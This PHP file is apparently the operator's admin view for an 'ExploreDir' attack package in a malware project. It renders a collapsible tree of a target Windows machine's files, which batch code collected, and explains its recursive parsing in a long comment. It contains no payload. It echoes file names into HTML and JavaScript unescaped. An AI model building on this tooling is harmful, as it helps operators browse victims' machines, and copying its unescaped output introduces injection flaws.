<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir\ExploreDir;
use Kelvinho\Virus\Singleton\Logs;
use function Kelvinho\Virus\map;
use function Kelvinho\Virus\niceFileSize;

/*
How the function below even work? I'm too lazy to explain, but this flow should give you a rough understanding:

so,
0f0
0f1
0d2
	1f3
	1f4
	1f5
	1d6
		2f7
		2f8
		2d9
		2d10
			3f11
	1d12
	1d13
0d14
	1f15
process 0f0, reads, echos, return "", or successful, and there are still elements left
process 0f1, reads, echos, return "", or successful, and there are still elements left
process 0d2, given depth 0 by hand, no prev, reads, echos. Loops
	process 1f3, reads, echos, return ""
	process 1f4, reads, echos, return ""
	process 1f5, reads, echos, return ""
	process 1d6, given depth 1 by 0d2, no prev, reads, echos. Loops:
		process 2f7, echos, return ""
		process 2f8, echos, return ""
		process 2d9, given depth 2 by 1d6, no prev, reads, echos. Loops:
			process 2d10, given depth 3 by 2d9, no prev, reads. Sees new depth lower than given, does not process, return "unprocessed 2d10" and does not echo
			sees unprocessed line, break, look into unprocessed line, depth (2) equal given depth (2), return the same unprocessed line of 2d10
		sees unprocessed line 2d10, break, look into unprocessed line 2d10, see depth (2) larger than given depth (1), process the unprocessed line 2d10, given depth 2 by 1d6, prev, echos. Loops:
			process 3f11, echos, return ""
			process 1d12, given depth 3 by 2d10, no prev, reads. Sees new depth (1) lower than given (3), does not process, return "unprocessed 1d12" and does not echo
			sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) smaller than given depth (2), return "unprocessed 1d12" and does not echo
		sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) equal given depth (1), return "unprocessed 1d12" and does not echo
	sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) larger than given depth (0), process the unprocessed line 1d12, given depth 1 by 0d2, prev, echos. Loops:
		process 1d13, given depth 2 by 1d12, no prev, reads. Sees new depth (1) lower than given depth (2), does not process, return "unprocessed 1d13" and does not echo

*/

/**
 * Processes a line in the directories file and split out the result.
 *
 * The directory data is stored in a file, with each line for a single directory or file. A file looks like this:
 *     4;f;588;11/29/2019 11:36 PM;random file.txt
 * First number is the directory depth, second is "f", for file, third is the file size in bytes, fourth is the last modified date, last is the file name itself
 *
 * A folder looks like this:
 *     6;d;-;11/29/2019 11:36 PM;League of Legends
 * First number is the directory depth, second is "d", for directory, third is "-", because calculating directory size is expensive, fourth is the last modified date, last is the folder name itself
 *
 * This file has a cap of 10k lines, because the batch code to collect this is configured to stop after 10k lines. At
 * first, my solution to this is build a tree data structure to store everything. But some directory file can be up to 1MB
 * on disk, and transforming it into a data structure in RAM just to display it is quite a waste of resources, not to
 * mention slow. This function is meant to print out the directory structure without constructing a data structure.
 *
 * You can call this a hack, and like, the code is not supposed to be elegant at all, but is meant to be fast. I suggest
 * you not touch anything here.
 *
 * @param resource $handle The file handle
 * @param int $givenDepth Current perceived depth of current line
 * @param array $path Path of current context, to display to users
 * @param string|null $unprocessedLine Unprocessed line from previous call to processLine.
 * @return string|null Unprocessed line when processing, or null if there aren't any
 */
function processLine($handle, int $givenDepth, array &$path, string $unprocessedLine = null): ?string {
    if ($unprocessedLine != null) {
        if (empty(trim($unprocessedLine))) {
            Logs::unreachableState("ExploreDir package, admin screen");
        }
        $lineDepth = (int)explode(";", $unprocessedLine)[0];
        if ($lineDepth < $givenDepth) {
            return $unprocessedLine;
        }
        $line = $unprocessedLine;
    } else {
        $line = fgets($handle);
        if ($line === false) {
            return null;
        }
        if (empty(trim($line))) {
            return null;
        }
    }
    $contents = map(explode(";", $line), function ($element) {
        return trim($element);
    });
    switch ($contents[1]) {
        case "f": ?>
            <li>
                <pre onclick="copyToClipboard('<?php echo join("\\\\", $path) . "\\\\" . $contents[4]; ?>')"><?php echo $contents[4]; ?>, size: <?php echo niceFileSize((int)$contents[2]); ?>, last updated: <?php echo $contents[3]; ?></pre>
            </li>
            <?php return "";
        case "d":
            $lineDepth = (int)$contents[0];
            if ($lineDepth < $givenDepth) {
                return $line;
            }
            $hash = "id_" . hash("sha256", rand()); ?>
            <li>
                <pre onclick="toggle('<?php echo $hash; ?>')"
                     style="cursor: pointer;"><b><?php echo trim($contents[4]); ?>, last updated: <?php echo $contents[3]; ?></b></pre>
                <ul id="<?php echo $hash; ?>" style="list-style-type: none;" class="folding">
                    <?php
                    $unprocessedLine = null;
                    array_push($path, trim($contents[4]));
                    while (true) {
                        $unprocessedLine = processLine($handle, $givenDepth + 1, $path, $unprocessedLine);
                        if ($unprocessedLine === null) {
                            break;
                        }
                        if ($unprocessedLine !== "") {
                            $contents = explode(";", $unprocessedLine);
                            if (((int)$contents[0]) <= $givenDepth) { // return unprocessed line
                                break;
                            }
                        }
                    }
                    array_pop($path);
                    ?>
                </ul>
            </li>
            <?php
            if ($unprocessedLine != null) {
                return $unprocessedLine;
            }
            return "";
        default:
            Logs::unreachableState("ExploreDir package, admin screen, f|d");
            return null;
    }
}

/** @var ExploreDir $attack */

?>
<p>This attack is executed. Bold lines are the directories. You can click on them to either expand or
    collapse a directory. Click <a onclick="collapseAll()" class="link">here</a> to
    collapse all. You can also click on files to copy their address for other purposes.</p>
<p>Please note that this might not be all of the files available. The maximum number of files and folders
    scanned are <?php echo ExploreDir::MAX_LINES ?>. Also if nothing is displayed below, it could be that
    the folder really does not have anything in it, or you have entered a nonexistent directory.</p>
<p>This is the file tree of <?php echo $attack->getRootDir(); ?></p>
<?php
$handle = fopen(DATA_FILE . "/attacks/" . $attack->getAttackId() . "/dirs.txt", "r");
if ($handle === false) {
    ?>(Can't read internal file)<?php
}
fgets($handle); // skips first line, cuz it's supposed to be empty
?>
<ul style="list-style-type: none;overflow: auto;">
    <?php
    $unprocessedLine = null;
    $path = [str_replace("\\", "\\\\", trim($attack->getRootDir(), "\\"))];
    while (true) {
        $unprocessedLine = processLine($handle, 0, $path, $unprocessedLine);
        if ($unprocessedLine === null) {
            break;
        }
    }
    ?>
</ul>
